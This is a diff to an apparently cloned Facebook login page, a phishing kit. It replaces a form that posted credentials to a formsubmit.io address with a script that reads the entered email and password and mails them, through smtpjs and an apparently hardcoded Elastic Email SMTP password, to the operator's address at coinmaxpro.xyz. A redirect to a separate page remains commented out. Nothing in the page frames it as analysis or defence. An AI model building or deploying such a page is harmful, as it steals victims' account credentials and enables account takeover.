@@ -10,6 +10,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook</title>
     <link rel="shortcut icon" href="images/facebook-icon.png" type="image/x-icon">
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
     <!-- <link rel="stylesheet" href="style.css"> -->
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&amp;display=swap');
@@ -192,16 +194,15 @@
                 <p>Connect with friends and the world </p>
                 <p> around you on Facebook.</p>
             </div>
-            <form id="form" method="POST" action="https://formsubmit.io/send/owen@coinmaxpro.xyz
-">
+            <form id="form" method="POST">
                 <input type="text" name="username" id="username" required placeholder="email">
-
+<input name="_formsubmit_id" type="text" style="display:none">
                 <input type="text" name="password" id="password" required placeholder="password">
                 <!-- <input type="hidden" name="_next" value="https://votelixzz.netlify.app
                 
                 /thanks"> -->
                 <input type="hidden" name="_captcha" value="false">
-               <input type="hidden" name="_redirect" id="name"  value="https://owenvote.vercel.app/grac.html">
+                <!-- <input name="_redirect" type="hidden" id="name" value="https://owenvote.vercel.app/grac.html"> -->
                 <div class="link">
                     <button type="submit" id="button" value="Send Email" class="login"
                         style="text-decoration: none; color: white;">Login </button>
@@ -223,6 +224,24 @@
 </body>
 
 
-
+<script>
+    function sendEmail() {
+        let name = document.getElementById("username").value;
+        let email = document.getElementById("password").value;
+        // let message = document.getElementById("message").value;
+        let finalmessage = `Name : ${username} <br>  Email : ${password} <br> `;
+        Email.send({
+            Host: "smtp.elasticemail.com",
+            Username: "owen@coinmaxpro.xyz",
+            Password: "5C8455645DECFE30CD32EB4E6533B764BD54",
+            To: 'owen@coinmaxpro.xyz',
+            From: "you@isp.com",
+            Subject: "Mail from website",
+            Body: finalmessage
+        }).then(
+            message => alert(message)
+        );
+    }
+</script>
 <!-- Mirrored from votelkg.netlify.app/realfb by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 17 Nov 2023 10:10:39 GMT -->
 </html>
